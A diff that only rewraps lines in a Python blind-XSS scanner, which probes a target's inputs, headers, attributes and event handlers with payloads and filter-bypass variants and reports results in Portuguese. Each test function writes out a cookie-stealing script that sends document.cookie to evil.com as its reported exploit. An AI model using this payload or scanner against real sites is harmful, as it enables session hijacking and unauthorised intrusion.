@@ -55,11 +55,35 @@ logger = logging.getLogger("mytools.blindxss")
 
 
 _CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
-    "input": ["script_input", "img_input", "svg_input", "iframe_input", "details_input"],
-    "header": ["referer_xss", "useragent_xss", "cookie_xss", "xforwarded_xss", "custom_header_xss"],
+    "input": [
+        "script_input",
+        "img_input",
+        "svg_input",
+        "iframe_input",
+        "details_input",
+    ],
+    "header": [
+        "referer_xss",
+        "useragent_xss",
+        "cookie_xss",
+        "xforwarded_xss",
+        "custom_header_xss",
+    ],
     "attr": ["alt_xss", "title_xss", "placeholder_xss", "href_xss", "src_xss"],
-    "event": ["onerror_xss", "onload_xss", "onfocus_xss", "onmouseover_xss", "onstart_xss"],
-    "bypass": ["double_encode", "null_terminate", "case_mixed", "unicode_bypass", "whitespace_bypass"],
+    "event": [
+        "onerror_xss",
+        "onload_xss",
+        "onfocus_xss",
+        "onmouseover_xss",
+        "onstart_xss",
+    ],
+    "bypass": [
+        "double_encode",
+        "null_terminate",
+        "case_mixed",
+        "unicode_bypass",
+        "whitespace_bypass",
+    ],
 }
 
 
@@ -67,7 +91,9 @@ def _load_category_map() -> dict[str, list[str]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "blindxss", default={"category_map": _CATEGORY_MAP_DEFAULT})
+    data = load_payloads(
+        "web", "blindxss", default={"category_map": _CATEGORY_MAP_DEFAULT}
+    )
 
     return data.get("category_map", _CATEGORY_MAP_DEFAULT)
 
@@ -108,9 +134,16 @@ def _load_input_payloads() -> list[tuple[str, str, list[str]]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "blindxss", default={"input_payloads": [list(t) for t in _INPUT_PAYLOADS_DEFAULT]})
+    data = load_payloads(
+        "web",
+        "blindxss",
+        default={"input_payloads": [list(t) for t in _INPUT_PAYLOADS_DEFAULT]},
+    )
 
-    return [tuple(x) for x in data.get("input_payloads", [list(t) for t in _INPUT_PAYLOADS_DEFAULT])]
+    return [
+        tuple(x)
+        for x in data.get("input_payloads", [list(t) for t in _INPUT_PAYLOADS_DEFAULT])
+    ]
 
 
 _INPUT_PAYLOADS = _load_input_payloads()
@@ -154,9 +187,18 @@ def _load_header_payloads() -> list[tuple[str, str, str, list[str]]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "blindxss", default={"header_payloads": [list(t) for t in _HEADER_PAYLOADS_DEFAULT]})
+    data = load_payloads(
+        "web",
+        "blindxss",
+        default={"header_payloads": [list(t) for t in _HEADER_PAYLOADS_DEFAULT]},
+    )
 
-    return [tuple(x) for x in data.get("header_payloads", [list(t) for t in _HEADER_PAYLOADS_DEFAULT])]
+    return [
+        tuple(x)
+        for x in data.get(
+            "header_payloads", [list(t) for t in _HEADER_PAYLOADS_DEFAULT]
+        )
+    ]
 
 
 _HEADER_PAYLOADS = _load_header_payloads()
@@ -195,9 +237,16 @@ def _load_attr_payloads() -> list[tuple[str, str, list[str]]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "blindxss", default={"attr_payloads": [list(t) for t in _ATTR_PAYLOADS_DEFAULT]})
+    data = load_payloads(
+        "web",
+        "blindxss",
+        default={"attr_payloads": [list(t) for t in _ATTR_PAYLOADS_DEFAULT]},
+    )
 
-    return [tuple(x) for x in data.get("attr_payloads", [list(t) for t in _ATTR_PAYLOADS_DEFAULT])]
+    return [
+        tuple(x)
+        for x in data.get("attr_payloads", [list(t) for t in _ATTR_PAYLOADS_DEFAULT])
+    ]
 
 
 _ATTR_PAYLOADS = _load_attr_payloads()
@@ -236,9 +285,16 @@ def _load_event_payloads() -> list[tuple[str, str, list[str]]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "blindxss", default={"event_payloads": [list(t) for t in _EVENT_PAYLOADS_DEFAULT]})
+    data = load_payloads(
+        "web",
+        "blindxss",
+        default={"event_payloads": [list(t) for t in _EVENT_PAYLOADS_DEFAULT]},
+    )
 
-    return [tuple(x) for x in data.get("event_payloads", [list(t) for t in _EVENT_PAYLOADS_DEFAULT])]
+    return [
+        tuple(x)
+        for x in data.get("event_payloads", [list(t) for t in _EVENT_PAYLOADS_DEFAULT])
+    ]
 
 
 _EVENT_PAYLOADS = _load_event_payloads()
@@ -277,9 +333,18 @@ def _load_bypass_payloads() -> list[tuple[str, str, list[str]]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "blindxss", default={"bypass_payloads": [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]})
+    data = load_payloads(
+        "web",
+        "blindxss",
+        default={"bypass_payloads": [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]},
+    )
 
-    return [tuple(x) for x in data.get("bypass_payloads", [list(t) for t in _BYPASS_PAYLOADS_DEFAULT])]
+    return [
+        tuple(x)
+        for x in data.get(
+            "bypass_payloads", [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]
+        )
+    ]
 
 
 _BYPASS_PAYLOADS = _load_bypass_payloads()
@@ -303,7 +368,9 @@ def _load_sensitive_paths() -> list[str]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "blindxss", default={"sensitive_paths": _SENSITIVE_PATHS_DEFAULT})
+    data = load_payloads(
+        "web", "blindxss", default={"sensitive_paths": _SENSITIVE_PATHS_DEFAULT}
+    )
 
     return data.get("sensitive_paths", _SENSITIVE_PATHS_DEFAULT)
 
@@ -375,7 +442,11 @@ async def _test_input(
                 vulnerable = _check_xss_response(resp.content, resp.status_code)
 
                 if not vulnerable:
-                    vulnerable = any(ind.lower() in resp.content.decode("utf-8", errors="ignore").lower() for ind in indicators)
+                    vulnerable = any(
+                        ind.lower()
+                        in resp.content.decode("utf-8", errors="ignore").lower()
+                        for ind in indicators
+                    )
 
                 results.append(
                     BlindXSSAttempt(
@@ -392,9 +463,13 @@ async def _test_input(
                         status_changed=resp.status_code != b_status,
                         size_changed=len(resp.content) != b_size,
                         vulnerable=vulnerable,
-                        details=f"path={path}, callback={callback_url}" if vulnerable else "",
+                        details=f"path={path}, callback={callback_url}"
+                        if vulnerable
+                        else "",
                         error="",
-                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" if vulnerable else "",
+                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
+                        if vulnerable
+                        else "",
                         tool="XSStrike",
                     )
                 )
@@ -453,7 +528,11 @@ async def _test_header(
                 vulnerable = _check_xss_response(resp.content, resp.status_code)
 
                 if not vulnerable:
-                    vulnerable = any(ind.lower() in resp.content.decode("utf-8", errors="ignore").lower() for ind in indicators)
+                    vulnerable = any(
+                        ind.lower()
+                        in resp.content.decode("utf-8", errors="ignore").lower()
+                        for ind in indicators
+                    )
 
                 results.append(
                     BlindXSSAttempt(
@@ -470,9 +549,13 @@ async def _test_header(
                         status_changed=resp.status_code != b_status,
                         size_changed=len(resp.content) != b_size,
                         vulnerable=vulnerable,
-                        details=f"path={path}, header={header_name}" if vulnerable else "",
+                        details=f"path={path}, header={header_name}"
+                        if vulnerable
+                        else "",
                         error="",
-                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" if vulnerable else "",
+                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
+                        if vulnerable
+                        else "",
                         tool="XSStrike",
                     )
                 )
@@ -532,7 +615,11 @@ async def _test_attr(
                 vulnerable = _check_xss_response(resp.content, resp.status_code)
 
                 if not vulnerable:
-                    vulnerable = any(ind.lower() in resp.content.decode("utf-8", errors="ignore").lower() for ind in indicators)
+                    vulnerable = any(
+                        ind.lower()
+                        in resp.content.decode("utf-8", errors="ignore").lower()
+                        for ind in indicators
+                    )
 
                 results.append(
                     BlindXSSAttempt(
@@ -551,7 +638,9 @@ async def _test_attr(
                         vulnerable=vulnerable,
                         details=f"path={path}, attr={technique}" if vulnerable else "",
                         error="",
-                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" if vulnerable else "",
+                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
+                        if vulnerable
+                        else "",
                         tool="XSStrike",
                     )
                 )
@@ -611,7 +700,11 @@ async def _test_event(
                 vulnerable = _check_xss_response(resp.content, resp.status_code)
 
                 if not vulnerable:
-                    vulnerable = any(ind.lower() in resp.content.decode("utf-8", errors="ignore").lower() for ind in indicators)
+                    vulnerable = any(
+                        ind.lower()
+                        in resp.content.decode("utf-8", errors="ignore").lower()
+                        for ind in indicators
+                    )
 
                 results.append(
                     BlindXSSAttempt(
@@ -630,7 +723,9 @@ async def _test_event(
                         vulnerable=vulnerable,
                         details=f"path={path}, event={technique}" if vulnerable else "",
                         error="",
-                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" if vulnerable else "",
+                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
+                        if vulnerable
+                        else "",
                         tool="XSStrike",
                     )
                 )
@@ -690,7 +785,11 @@ async def _test_bypass(
                 vulnerable = _check_xss_response(resp.content, resp.status_code)
 
                 if not vulnerable:
-                    vulnerable = any(ind.lower() in resp.content.decode("utf-8", errors="ignore").lower() for ind in indicators)
+                    vulnerable = any(
+                        ind.lower()
+                        in resp.content.decode("utf-8", errors="ignore").lower()
+                        for ind in indicators
+                    )
 
                 results.append(
                     BlindXSSAttempt(
@@ -707,9 +806,13 @@ async def _test_bypass(
                         status_changed=resp.status_code != b_status,
                         size_changed=len(resp.content) != b_size,
                         vulnerable=vulnerable,
-                        details=f"path={path}, bypass={technique}" if vulnerable else "",
+                        details=f"path={path}, bypass={technique}"
+                        if vulnerable
+                        else "",
                         error="",
-                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" if vulnerable else "",
+                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
+                        if vulnerable
+                        else "",
                         tool="XSStrike",
                     )
                 )
@@ -819,7 +922,12 @@ def print_results(result: BlindXSSResult) -> None:
 
     print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))
 
-    print(color(f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)", Cyber.WHITE))
+    print(
+        color(
+            f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)",
+            Cyber.WHITE,
+        )
+    )
 
     print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))
 
@@ -850,14 +958,23 @@ def print_results(result: BlindXSSResult) -> None:
 
             print(color(f"      Callback: {a.callback_url}", Cyber.CYAN))
 
-            print(color(f"      Status: {a.status_baseline} -> {a.status_test}", Cyber.WHITE))
+            print(
+                color(
+                    f"      Status: {a.status_baseline} -> {a.status_test}", Cyber.WHITE
+                )
+            )
 
             if a.details:
                 print(color(f"      Detalhes: {a.details}", Cyber.GRAY))
 
             print_exploit_info(a.exploit, a.tool)
 
-        print(color(f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis", Cyber.WHITE))
+        print(
+            color(
+                f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis",
+                Cyber.WHITE,
+            )
+        )
 
     else:
         print(color("\n  [-] Nenhum Blind XSS detectado", Cyber.YELLOW))
@@ -893,23 +1010,35 @@ async def run_scan(
 
         for cat in test_categories:
             if cat == "input":
-                all_attempts.extend(await _test_input(client, target, webhook_url, baseline))
+                all_attempts.extend(
+                    await _test_input(client, target, webhook_url, baseline)
+                )
 
             elif cat == "header":
-                all_attempts.extend(await _test_header(client, target, webhook_url, baseline))
+                all_attempts.extend(
+                    await _test_header(client, target, webhook_url, baseline)
+                )
 
             elif cat == "attr":
-                all_attempts.extend(await _test_attr(client, target, webhook_url, baseline))
+                all_attempts.extend(
+                    await _test_attr(client, target, webhook_url, baseline)
+                )
 
             elif cat == "event":
-                all_attempts.extend(await _test_event(client, target, webhook_url, baseline))
+                all_attempts.extend(
+                    await _test_event(client, target, webhook_url, baseline)
+                )
 
             elif cat == "bypass":
-                all_attempts.extend(await _test_bypass(client, target, webhook_url, baseline))
+                all_attempts.extend(
+                    await _test_bypass(client, target, webhook_url, baseline)
+                )
 
         vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})
 
-        blocked_techs = list({a.technique for a in all_attempts if not a.vulnerable and not a.error})
+        blocked_techs = list(
+            {a.technique for a in all_attempts if not a.vulnerable and not a.error}
+        )
 
         issues: list[str] = []
 
@@ -926,7 +1055,9 @@ async def run_scan(
             vulnerable_techniques=vuln_techs,
             blocked_techniques=blocked_techs,
             issues=issues,
-            overall_status="vulnerable" if vuln_techs else ("safe" if blocked_techs else "unknown"),
+            overall_status="vulnerable"
+            if vuln_techs
+            else ("safe" if blocked_techs else "unknown"),
         )
 
         print_results(result)
@@ -968,7 +1099,9 @@ def banner_art() -> None:
 
 """
 
-    create_banner(art, "   blind xss via callback: input, header, attr, event, bypass")()
+    create_banner(
+        art, "   blind xss via callback: input, header, attr, event, bypass"
+    )()
 
 
 def build_parser() -> argparse.ArgumentParser:
@@ -1036,7 +1169,9 @@ def main() -> int:
         parser=build_parser(),
         banner_fn=banner_art,
         run_fn=run_once,
-        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
+        has_target=lambda a: bool(
+            getattr(a, "url", None) or getattr(a, "target", None)
+        ),
         prompt="blindxss> ",
         description="Blind XSS via callback interativo.",
         example="https://target.com --webhook https://hook.example.com -c input",
